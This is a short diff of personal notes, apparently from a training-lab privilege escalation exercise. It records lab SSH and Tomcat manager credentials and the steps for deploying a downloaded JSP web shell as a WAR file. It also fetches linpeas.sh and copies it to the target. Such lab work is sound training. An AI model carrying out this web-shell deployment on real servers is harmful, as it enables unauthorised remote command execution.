@@ -1,0 +1,35 @@
+ssh htb-student@10.129.78.151
+Academy_LLPE!
+
+barry
+i_l0ve_s3cur1ty!
+
+New IP :
+
+ssh barry@10.129.78.151
+i_l0ve_s3cur1ty!
+
+http://10.129.78.151:8080/manager/html
+tomcatadm
+T0mc@t_s3cret_p@ss!
+
+http://10.129.78.151:8080/backup2/cmd.jsp
+
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup2.war cmd.jsp
+Browse
+select the .war file
+Deploy
+
+--> This file is uploaded to the manager GUI, after which the /backup application will be added to the table
+
+http://10.129.78.151:8080/backup2/cmd.jsp
+
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+
+scp linpeas.sh barry@10.129.78.151:/home/barry/linpeas.sh
+i_l0ve_s3cur1ty!
+
+cd /home/barry
+chmod 777
+./linpeas.sh
